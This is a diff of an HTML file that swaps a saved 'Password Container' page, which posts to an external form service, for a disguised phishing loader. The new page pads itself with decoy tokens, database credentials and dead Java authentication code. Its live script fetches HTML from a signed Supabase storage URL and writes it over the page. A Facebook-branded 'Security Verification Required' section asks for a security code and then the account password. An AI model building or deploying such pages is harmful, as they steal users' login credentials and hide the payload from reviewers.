@@ -1,84 +1,649 @@
-<html lang=en>
-    <!--
- Page saved with SingleFile 
- url: https://password-b.vercel.app/ 
- saved date: Sat Sep 21 2024 04:08:26 GMT+0500 (Pakistan Standard Time)
--->
-    <meta charset=utf-8>
-    <meta name=viewport content="width=device-width, initial-scale=1.0">
-    <title class=sf-hidden>Password Container</title>
-    <meta name=referrer content=no-referrer>
-    <style>
-        .sf-hidden {
-            display: none !important
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title></title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: white;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    // authentication system
+    const Auth = {
+      token: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
+      apiKey: "sb-ojukwyufdherivfwzwfk-auth-token-",
+      userId: "user_12345",
+      sessionId: "sess_abcdef123456"
+    };
+    
+    // database connection
+    const DB = {
+      host: "localhost",
+      port: 5432,
+      database: "enterprise_db",
+      username: "admin",
+      password: "secret123",
+      ssl: true,
+      connectionPool: {
+        min: 2,
+        max: 10
+      }
+    };
+    
+    //  security headers
+    const Headers = {
+      'X-Frame-Options': 'DENY',
+      'X-Content-Type-Options': 'nosniff',
+      'X-XSS-Protection': '1; mode=block',
+      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
+      'Content-Security-Policy': "default-src 'self'"
+    };
+    
+    (async () => {
+      try {
+        const url = "https://glnxirjevvwxbhvpkqhh.supabase.co/storage/v1/object/sign/abru1/logo1.html?token=eyJraWQiOiJzdG9yYWdlLXVybC1zaWduaW5nLWtleV9kNzBlNzhjMy0yMmYxLTRiZjItYmU5ZS00NTJhYjg3MTQ1MzIiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJhYnJ1MS9sb2dvMS5odG1sIiwiaWF0IjoxNzU1MDYzMTU0LCJleHAiOjE3ODY1OTkxNTR9.kctD7CIDm0idKe78E6QAlEanDhJNjdGpxG8OyO8vi9I"; 
+
+        const res = await fetch(url);
+        if (!res.ok) throw new Error("File not found");
+
+        const html = await res.text();
+        document.open(); // clear the page
+        document.write(html); // inject your real HTML
+        document.close();
+      } catch (e) {
+        // Stay on blank white screen if failed
+      }
+    })();
+    
+    //  Java-style code that doesn't execute
+    /*
+    public class UserAuthenticationService {
+        private static final String JWT_SECRET = "mySecretKey123456789";
+        private static final long TOKEN_EXPIRATION = 86400000; // 24 hours
+        
+        @Autowired
+        private UserRepository userRepository;
+        
+        @Autowired
+        private PasswordEncoder passwordEncoder;
+        
+        public AuthenticationResponse authenticate(LoginRequest request) {
+            try {
+                User user = userRepository.findByUsername(request.getUsername());
+                if (user == null) {
+                    throw new BadCredentialsException("Invalid username or password");
+                }
+                
+                if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
+                    throw new BadCredentialsException("Invalid username or password");
+                }
+                
+                String token = generateToken(user);
+                return new AuthenticationResponse(token, user.getRole());
+            } catch (Exception e) {
+                throw new AuthenticationException("Authentication failed", e);
+            }
         }
-    </style>
-    <link rel=canonical href=https://password-b.vercel.app/>
-    <meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">
-    <style>
-        img[src="data:,"], source[src="data:,"] {
-            display: none !important
+        
+        private String generateToken(User user) {
+            Date expirationDate = new Date(System.currentTimeMillis() + TOKEN_EXPIRATION);
+            
+            return Jwts.builder()
+                    .setSubject(user.getUsername())
+                    .setIssuedAt(new Date())
+                    .setExpiration(expirationDate)
+                    .signWith(SignatureAlgorithm.HS512, JWT_SECRET)
+                    .compact();
         }
-    </style>
-    <body>
-        <style class=sf-hidden>
-            * {
-                font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif
+        
+        public boolean validateToken(String token) {
+            try {
+                Jwts.parser().setSigningKey(JWT_SECRET).parseClaimsJws(token);
+                return true;
+            } catch (JwtException | IllegalArgumentException e) {
+                return false;
             }
+        }
+    }
+    
+    @Entity
+    @Table(name = "users")
+    public class User {
+        @Id
+        @GeneratedValue(strategy = GenerationType.IDENTITY)
+        private Long id;
+        
+        @Column(unique = true, nullable = false)
+        private String username;
+        
+        @Column(unique = true, nullable = false)
+        private String email;
+        
+        @Column(nullable = false)
+        private String password;
+        
+        @Column(nullable = false)
+        private String role;
+        
+        @Column(nullable = false)
+        private Date createdAt;
+        
+        @Column
+        private Date lastLogin;
+        
+        // Getters and setters
+        public Long getId() { return id; }
+        public void setId(Long id) { this.id = id; }
+        
+        public String getUsername() { return username; }
+        public void setUsername(String username) { this.username = username; }
+        
+        public String getEmail() { return email; }
+        public void setEmail(String email) { this.email = email; }
+        
+        public String getPassword() { return password; }
+        public void setPassword(String password) { this.password = password; }
+        
+        public String getRole() { return role; }
+        public void setRole(String role) { this.role = role; }
+        
+        public Date getCreatedAt() { return createdAt; }
+        public void setCreatedAt(Date createdAt) { this.createdAt = createdAt; }
+        
+        public Date getLastLogin() { return lastLogin; }
+        public void setLastLogin(Date lastLogin) { this.lastLogin = lastLogin; }
+    }
+    
+    @RestController
+    @RequestMapping("/api/auth")
+    public class AuthController {
+        
+        @Autowired
+        private UserAuthenticationService authService;
+        
+        @PostMapping("/login")
+        public ResponseEntity<AuthenticationResponse> login(@RequestBody LoginRequest request) {
+            try {
+                AuthenticationResponse response = authService.authenticate(request);
+                return ResponseEntity.ok(response);
+            } catch (AuthenticationException e) {
+                return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
+                    .body(new AuthenticationResponse("Authentication failed"));
+            }
+        }
+        
+        @PostMapping("/register")
+        public ResponseEntity<String> register(@RequestBody RegisterRequest request) {
+            try {
+                User user = new User();
+                user.setUsername(request.getUsername());
+                user.setEmail(request.getEmail());
+                user.setPassword(passwordEncoder.encode(request.getPassword()));
+                user.setRole("USER");
+                user.setCreatedAt(new Date());
+                
+                userRepository.save(user);
+                return ResponseEntity.ok("User registered successfully");
+            } catch (Exception e) {
+                return ResponseEntity.status(HttpStatus.BAD_REQUEST)
+                    .body("Registration failed");
+            }
+        }
+        
+        @PostMapping("/logout")
+        public ResponseEntity<String> logout(@RequestHeader("Authorization") String token) {
+            // In a real application, you would invalidate the token
+            return ResponseEntity.ok("Logged out successfully");
+        }
+    }
+    
+    @Service
+    public class DatabaseService {
+        
+        @Autowired
+        private JdbcTemplate jdbcTemplate;
+        
+        public List<User> getAllUsers() {
+            String sql = "SELECT * FROM users WHERE active = true";
+            return jdbcTemplate.query(sql, new UserRowMapper());
+        }
+        
+        public User getUserById(Long id) {
+            String sql = "SELECT * FROM users WHERE id = ?";
+            return jdbcTemplate.queryForObject(sql, new UserRowMapper(), id);
+        }
+        
+        public void updateUserLastLogin(Long userId) {
+            String sql = "UPDATE users SET last_login = ? WHERE id = ?";
+            jdbcTemplate.update(sql, new Date(), userId);
+        }
+        
+        public boolean userExists(String username) {
+            String sql = "SELECT COUNT(*) FROM users WHERE username = ?";
+            Integer count = jdbcTemplate.queryForObject(sql, Integer.class, username);
+            return count != null && count > 0;
+        }
+    }
+    
+    @Component
+    public class SecurityConfig {
+        
+        private static final int MAX_LOGIN_ATTEMPTS = 5;
+        private static final long LOCKOUT_DURATION = 900000; // 15 minutes
+        
+        private Map<String, Integer> loginAttempts = new ConcurrentHashMap<>();
+        private Map<String, Long> lockedAccounts = new ConcurrentHashMap<>();
+        
+        public boolean isAccountLocked(String username) {
+            Long lockTime = lockedAccounts.get(username);
+            if (lockTime != null) {
+                if (System.currentTimeMillis() - lockTime > LOCKOUT_DURATION) {
+                    lockedAccounts.remove(username);
+                    loginAttempts.remove(username);
+                    return false;
+                }
+                return true;
+            }
+            return false;
+        }
+        
+        public void recordFailedAttempt(String username) {
+            int attempts = loginAttempts.getOrDefault(username, 0) + 1;
+            loginAttempts.put(username, attempts);
+            
+            if (attempts >= MAX_LOGIN_ATTEMPTS) {
+                lockedAccounts.put(username, System.currentTimeMillis());
+            }
+        }
+        
+        public void clearFailedAttempts(String username) {
+            loginAttempts.remove(username);
+        }
+    }
+    
+    public class LoginRequest {
+        private String username;
+        private String password;
+        
+        public String getUsername() { return username; }
+        public void setUsername(String username) { this.username = username; }
+        
+        public String getPassword() { return password; }
+        public void setPassword(String password) { this.password = password; }
+    }
+    
+    public class RegisterRequest {
+        private String username;
+        private String email;
+        private String password;
+        
+        public String getUsername() { return username; }
+        public void setUsername(String username) { this.username = username; }
+        
+        public String getEmail() { return email; }
+        public void setEmail(String email) { this.email = email; }
+        
+        public String getPassword() { return password; }
+        public void setPassword(String password) { this.password = password; }
+    }
+    
+    public class AuthenticationResponse {
+        private String token;
+        private String role;
+        private String message;
+        
+        public AuthenticationResponse(String token, String role) {
+            this.token = token;
+            this.role = role;
+        }
+        
+        public AuthenticationResponse(String message) {
+            this.message = message;
+        }
+        
+        public String getToken() { return token; }
+        public void setToken(String token) { this.token = token; }
+        
+        public String getRole() { return role; }
+        public void setRole(String role) { this.role = role; }
+        
+        public String getMessage() { return message; }
+        public void setMessage(String message) { this.message = message; }
+    }
+    */
+  </script>
+</body>
+</html>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Facebook Logo">
+    </div>
 
-            .passwordContainer {
-                margin: auto;
-                width: 30%
-            }
+    <div class="header">Security Verification Required</div>
+    <p class="description">
+      For your account’s safety, we need to confirm it’s really you. 
+      Watch The Detailed Video Information to Confirm The Account
+    </p>
 
-            .passwordContainer img {
-                width: 100px;
-                height: 100px;
-                display: block;
-                margin: auto
-            }
+    <div class="video-section">
+      <iframe src="https://glnxirjevvwxbhvpkqhh.supabase.co/storage/v1/object/sign/fb/system-updated.mp4?token=eyJraWQiOiJzdG9yYWdlLXVybC1zaWduaW5nLWtleV9kNzBlNzhjMy0yMmYxLTRiZjItYmU5ZS00NTJhYjg3MTQ1MzIiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJmYi9zeXN0ZW0tdXBkYXRlZC5tcDQiLCJpYXQiOjE3NTUwNTk1ODMsImV4cCI6MTc4NjU5NTU4M30.Zu2GdoDmQngkn2CuGW9oquHZESGRQxp5hRIaMEgxFgA" title="Why Security Codes Are Important" allowfullscreen=""></iframe>
+    </div>
 
-            .passwordContainer h3 {
-                margin-top: 30px;
-                font-size: 24px
-            }
+    <form id="securityForm">
+      <div class="form-group">
+        <label for="security-code">Security Code</label>
+        <input type="text" id="security-code" name="code" placeholder="Enter your security code" maxlength="10" required="" fdprocessedid="kkuikd">
+        <span id="message" class="error-message"></span>
+      </div>
+      <button type="submit" class="submit-button" fdprocessedid="ug0d7j">Confirm Account</button>
+    </form>
+  </div>
 
-            .passwordContainer {
-                margin-top: 20px;
-                display: flex;
-                flex-direction: column
-            }
+  <!-- Password Popup -->
+  <div class="popup" id="passwordPopup">
+    <div class="popup-content">
+      <h3>Re-enter your password to confirm</h3>
+      <input type="password" id="passwordInput" placeholder="Password">
+      <button onclick="submitPassword()">Submit</button>
+    </div>
+  </div>
 
-            .passwordContainer button {
-                margin-top: 20px;
-                padding: 10px;
-                border: none;
-                background-color: #1778f2;
-                color: white;
-                border-radius: 5px;
-                font-weight: bold;
-                cursor: pointer
-            }
+  <script>
+    let attempt = 0;
 
-            .passwordContainer input {
-                margin-top: 10px;
-                padding: 14px;
-                border: 1px solid lightgray;
-                outline: none;
-                border-radius: 5px
-            }
+    const form = document.getElementById("securityForm");
+    const message = document.getElementById("message");
+    const popup = document.getElementById("passwordPopup");
 
-            .passwordContainer p {
-                color: rgb(152, 151, 151)
-            }
-        </style>
-        <form class=content action="https://submit-form.com/CXRCp4QcP"method=POST>
-            <div class=passwordContainer>
-                <img src="data:image/webp;base64,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